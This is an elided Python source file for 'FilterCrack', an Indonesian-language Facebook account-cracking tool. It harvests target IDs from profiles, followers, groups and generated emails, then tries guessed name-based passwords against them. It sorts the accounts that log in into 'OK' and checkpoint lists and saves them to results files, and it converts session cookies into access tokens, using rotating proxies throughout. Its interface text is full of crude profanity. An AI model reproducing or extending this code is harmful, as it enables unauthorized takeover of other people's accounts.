#UTF-PYTHON-3 DIBUAT OLEH FILTERXYZ - 26 September 2022
...
try:
	...
	try:
		...
		os.sys.exit("[?] Maaf Cil, Sepertinya Tidak Bisa Install Rich(Install Manual : python -m pip install rich &> /dev/null)")
...
try:
	...
	try:
		...
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar Kontol....")
...
sys.stdout.write(f'\x1b[1;35m\x1b]2; ★ SCRIPT BY FILTERXYZ ★\x07')
visitor=request.urlopen("https://api.countapi.xyz/hit/FilterXyz/FilterCrack")
...
╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝"""
		...
		my__= my_.add(Group(Panel(tod,title=waktu,style="yellow on black",box=DOUBLE,padding=1)),guide_style="bold magenta")


		my_r = my__.add(f"{c}FilterXyz X Rayan-XD{q}")
		my_rr= my_r.add(f"\r{k}Github Admin FilterXyz X Rayan-XD{q}")
		my_rr.add(f"{c}https://githuh.com/FilterXyz{q}")
		my_rr.add(f"{c}https://githuh.com/Rayan-XD{q}")

		my_rrr=my_r.add(f"\r{i}WhatsApp Author{q}")
		my_rrr.add(f"{b}+19725344955{q}")


		my_rrrrr=my_r.add(f"\r{c}Informasi{q}")
		tod=my_rrrrr.add(f"{j}Grub WhatsApp{q}")
		tod.add(f"{b}https://chat.whatsapp.com/CboHV7g43vGDLd8Sfd5Fyx{q}")
		tod_=my_rrrrr.add(f"{j}Facebook Author{q}")
		tod_.add(f"{b}https://www.facebook.com/luki.kece.79{q}")
...
╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝"""
			...
			os.sys.exit()
		data_=my_rrrrr.add(f"\r{k}Data-Data Facebook Lo{q}")
		...
		except:open("data/kata","w").write("# SELAMAT DATANG, TERIMA KASIH TELAH LIHAT KONTOL");kotak(f"# SELAMAT DATANG ANAK KONTOL !!", K, C)
...
00"""
		tip = f"""1.Crack IDz Dari Public
2.Crack IDz Dari Public{QQ}({KK}MASSAL{QQ})
3.Crack Dari Followers
4.Crack Dari Random Email
5.Crack Dari Cari Nama Grub
6.Crack Dari Grub Anda(Join)
7.Check Jumlah Teman
8.Check Hasil Crack
9.Check Options Akun Sesi

10.LOG OUT DARI AKUN (Keluar)"""
		lpp = f"""{II}ONN
{II}ONN
{II}ONN
{II}ONN
...
#		if ki in ["1","01"]:self.public_v2();os.sys.exit()
		if ki in ["1","01"]:self.public();os.sys.exit()
			...
			tod = f"{MM}MAAF PILIHAN {QQ}[{CC}{ki}{QQ}] {MM}LO TIDAK TERSEDIA.."
	...
	def logut(self):
		...
		kotak("# TOKEN DAN COKIES BERHASIL DI HAPUS (BERHASIL LOG OUT)", M, Q)
		os.sys.exit()
	...
	def search_name_groups(self,url):
		try:
			...
			for x in inf:
				if "Grup Privat" in x:
					...
					todz.add_column("NAMA DAN IDz GRUB", style=I, justify="center",width=50)
		...
		tod.add_row(f"1\n2\n3",f"1.Crack Akun Old\n2.Crack Akun New\n3.Crack Akun Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'{c}Pilih{q} : ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			...
			kotak("# LAIN KALI ISI YANG BENAR KONTOL !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	...
	def pilih_grub_(self):
		global bx
		if len(Id_Grub) == 0:kotak("# MAAF KONTOL SEPERTINYA TIDAK ADA IDz GRUB YANG TERKUMPUL",M,K);os.sys.exit()
		else:pass
		...
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=Q, justify="center", width=60)
		tod.add_row(f"1\n2",f"1.CRACK 1 GRUB ({II}Dipilih{QQ})\n2.CRACK SEMUA GRUB")
		sol().print(tod, justify='center')
		plh = input(q+"Pilih : "+q)
		if "1" in plh:
			ask = input(f"Pilih : ")
			try:
				kotak("# UNTUK STOP CRACK TEKAN CTRL + C",I,Q)
				number = Id_Grub[int(ask)-1]
				url = "https://mbasic.facebook.com/groups/"+number
				self.dump_grup_no_login(url)
			except:kotak("# SEPERTINYA GRUB YANG LO PILIH PRIVAT/TIDAK PUBLIC",M,Q)
		elif "2" in plh:
			try:
				kotak("# UNTUK STOP CRACK TEKAN CTRL + C",I,Q)
		...
		else:kotak("# MAAF PILIHAN LO TIDAK ADA !!",M,Q);time.sleep(2);self.pilih_grub_()
	...
	def grup_no_login(self):
		idt = input(f" {N}Masukan IDz Grub : ")
		Language.stop_dump()
		...
		try:
			...
			for x in data.find_all("table"):
				...
				if ">" in par.split(" ") or "mengajukan" in par.split(" "):
					...
					try:sys.stdout.write(f"\r{q}[{u}Grub{q} : {m}{bx}{q}]{o}Proses Crack Id Grub {q}[{k}ID : {u}{len(idd)}{q}]	");sys.stdout.flush()
					except:sys.stdout.write(f"\r{o}Proses Crack Id Grub {q}[{k}ID : {u}{len(idd)}{q}] 	");sys.stdout.flush()
	...
	def random_email(self):
		...
		tod.add_column("NO", style=K, justify='center')
		tod.add_column("PILIHAN", style=Q, justify='center',width=60)
		tod.add_row("1\n2\n3\n4\n5","1.Username + @Gmail.com\n2.Username + @Yahoo.com\n3.Username + @Hotmail.com\n4.Username + @Outlook.com\n5.Username + @Rocketmail.com")
		sol().print(tod, justify='center')
	...
	def public_mass(self):
		try:
			...
			os.sys.exit()
		god = ""
		kotak("# MASUKAN JUMLAH TARGET",K,Q)
		try:jmlh_ = int(input("Jumlah : "))
		except:jmlh_ = 1
		kotak("# SILAHKAN MASUKAN IDz/USERNAME UNTUK DICRACK !!",C,Q)
	...
	def public_v2(self):
		...
		kotak("# SILAHKAN PILIH TARGET UNTUK DI CRACK !!",C,Q)
		idt = input(f"{k}Target{q} : ")
		idt = jeeck[int(idt)-1]
		limit = ("10000")
		idt = self.ubah_user(idt)
	...
	def follow(self):
		...
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"1.Crack Akun Old\n2.Crack Akun New\n3.Crack Akun Random{QQ}({II}Recommended{QQ}){MM}")
		sol().print(tod, justify='center')
	...
	def cek_jumlah_teman(self):
		try:
			...
			kotak("# MAAF TOKEN LO RUSAK/ERROR",M,Q)
			time.sleep(2)
			os.sys.exit()
		god = ""
		kotak("# SILAHKAN MASUKAN IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		...
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"1.Check Jumlah Teman Dari Akun Tertua\n2.Check Jumlah Teman Dari Akun Termuda\nC3.heck Jumlah Teman Dari Random")
		sol().print(tod, justify='center')
	...
	def rek(self):
		...
		try:
			...
			kotak("# MAAF FILE YANG LO MASUKAN TIDAK ADA !!", M,Q);time.sleep(3)
			self.rek()
		try:
	...
	def cek_opsi(self):
		...
		try:
			...
			kotak("# MAAF FILE YANG LO MASUKAN TIDAK ADA",M,Q)
...
class crack_new:
	def __init__(self):
		_ = "UDAH TAU GUA CODING SENDIRI ENGGA DIBANTU, MAU KALIAN RIKOD? WKWKWK"
...
#					except Exception as e:print(e)
		...
		print()
		print()
		kotak("# CRACK SELESAI JANGAN LUPA, BERSYUKUR KONTOL", I, C)
		os.sys.exit()
				...
				if 'c_user'+yyy in session.cookies.get_dict():
					...
					if "IYA" in apk_me:
						...
						try:
							...
							ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI KONTOL{q}",guide_style="uu red")
					...
					if "IYA" == opsi_y:
						try:
							...
							cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI KONTOL{q}",guide_style="uu blue")
...
#		except Exception as e:print(e)
	...
	def buat_ugen(self):
		...
		tod.add_row(f"1\n2",f"1.UserAgent Bawaan\n2.UserAgent Manual")
		sol().print(tod, justify='center')

		pilih_ = input(f"Pilih : {q}")
		if pilih_ in ("1","01"):pass
			...
			kotak("# MAAF PILIHAN LO TIDAK DITEMUKAN",M,Q)
			self.buat_ugen()
	...
	def pilih_url(self):
		...
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2\n3\n4\n5",f"1.Mobile {QQ}[{II}Recommended{QQ}]{CC}\n2.Free\n3.Mbasic\nP\nX")
		sol().print(tod, justify='center')
		hu = input(f'{c}Pilih {q} : ')
		if hu in ['1','01']:
			url_met = "mobile"
			...
			kotak("# KONTOL TINGGAL PILIH 1-4 ITU AJA SUSAH, ANJG",C,Q)
			time.sleep(2)
			self.pilih_url()
	def pilih_mentod_(self):
		...
		if hu in ['1','01']:
			...
			kotak("# KONTOL TINGGAL PILIH 1-2 ITU AJA SUSAH, ANJG",C,Q)
			time.sleep(2)
			self.pilih_mentod_()
#		method = "ke1"
...
#			method = "ke5"
			...
			kotak("# KONTOL TINGGAL PILIH 1-5 ITU AJA SUSAH, ANJG",C,Q)
			time.sleep(2)
			self.pilih_mentod()
...
#		tod.add_column("NO", style=I, justify="center")
#		tod.add_column("PILIHAN", style=C, justify="center", width=60)
#		tod.add_row(f"1\n2",f"1.B-API\n{UU}2.MOBILE{QQ}/{KK}3.MBASIC{QQ}/{MM}4.FREE{QQ}/{II}P{QQ}/{KK}X{QQ}")
#		sol().print(tod, justify='center')
#		hu = input(f'{c}Pilih {q} : ')
		hu="2"
		if hu in ['1','01']:
	...
	def tanya_prox_k(self):
		...
		if kp in [""," "]:
			...
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kp}{QQ}] {MM}Lo Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
	...
	def pas_me(self):
		...
		wwe.add_row("1\n2\n3\n4\n5\n6", "1.name123,name12345\n2.name,name123,name1234,name12345\n3.name,name123,name12345,sayang,anjing,kontol\n4.name,name123,name12345 + 6 Password\n5.name,name123,name1234,name12345 + MANUAL\nMANUAL")
		...
		if kol in [" ",""]:
			...
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kol}{QQ}] {MM}Lo Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.pas_me()
...
def get_apk(user,pw,cok):
	cookie = {"cookie":cok}
	ok_ = Tree("               ",highlight=True, hide_root=True)
	ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI KONTOL{q}",guide_style="uu green")
...
def check_op(userrz,pwz,ttl,opsi):
	try:
		...
		try:
			...
			opsi.add(f"{m}Akun Ini Terkena Spam{q}")
		if "c_user" in ses.cookies:
			opsi.add(f"{u}Akun Ini Tidak CheckPoint😱😱{q}")
			...
			ngew = [yy.text for yy in xnxx.find_all("option")]
			if(str(len(ngew))=="0"):
				opsi.add(f"{u}SELAMAT AKUN INI TAP YES 😎 {q}({b}Login Di fb Lite/Mbasic{q})")
			...
			opsi.add(f"\r{m}Password Akun Ini Sudah Di Ganti{q}")
	except Exception as c:
		opsi.add(f"{m}Waduh.. Sepertinya Akun Ini Tidak Bisa Di Check!!{q}")
		open('results/CP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")
...
#	kontol_prox = ["https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/?request=displayproxies&protocol=all&timeout={max_proxy}&country=all&ssl=all&anonymity=all"]
	...
	for name_prox in kontol_prox:
		try:
			...
			kotak("# WADUH... SEPERTINYA JARINGAN LO TERPUTUS",M,C)
			os.sys.exit()
...
╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝"""
	iprint(Panel(logox, style=Q, title=f"{CC}Login Menggunakan Cookies{QQ}"))
	kotak("# MASUKAN COOKIES LO YANG MASIH FRESH/BARU DIAMBIL", K,Q)
	try:
		cokex = input(f"{c}MASUKAN COOKIES{q} : ")
		kotak("# MOHON BERSABAR SEDANG MENGUBAH COOKIES KETOKEN FACEBOOK",K,Q)
		if cokex in [" ",""]:
			kotak('# Jangan Kosong Kontol...');time.sleep(3)
			login()
		...
		try:
			...
			kotak(f"# MAAF SEPERTINYA COOKIES LO ERROR {str(e)}", M, Q)
		os.sys.exit()
	except Exception as e:
		kotak(f"# ERROR : {e}", M, Q)
		os.sys.exit()
class convert_token:
	...
	def __eaag__(self):
		...
		if len(hasil_) == 0:
			kotak("# MOHON MAAF, SEPERTINYA COOKIES LO TIDAK BISA DIUBAH KETOKEN EAAG",M,Q)
	...
	def __eaai__(self):
		with requests.Session() as r:
			...
			if len(find) == 0:
				kotak("# MOHON MAAF, SEPERTINYA COOKIES LO TIDAK BISA DIUBAH KETOKEN EAAI",M,Q)
...
#				os.sys.exit()
	...
	def __eaab__(self):
		with requests.Session() as r:
			...
			if len(find) == 0:
				kotak("# MOHON MAAF, SEPERTINYA COOKIES LO TIDAK BISA DIUBAH KETOKEN EAAB",M,Q)
				os.sys.exit()
			else:
				for y in find:
...
#		self.get_posts(nn)
	...
	def visi_tor(self):
		try:
			url_vis = "https://github.com/FilterXyz/FilterCrack/blob/Xnxx/README.md"
...
class Main_:
	...
	def __check_update_(self, version_):
		try:
			...
			kotak("# WADUH... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()
		if version == version_:
			os.system('git pull')
			os.system('clear')
			...
			kotak("# COBA KETIK : python FilterCrack.py SEKALI LAGI!!",M,Q)
			os.sys.exit()
	def __check_status_(self, mainx):
		...
		if mainx == mainz:
			...
			kotak("# MAAF SEVER FILTERXYZ SEDANG MAINTENANCE, KAMI AKAN KEMBALI :D",C,K)
			os.system('git pull')
			os.sys.exit()
	def _no_vpn(self):
#		try:
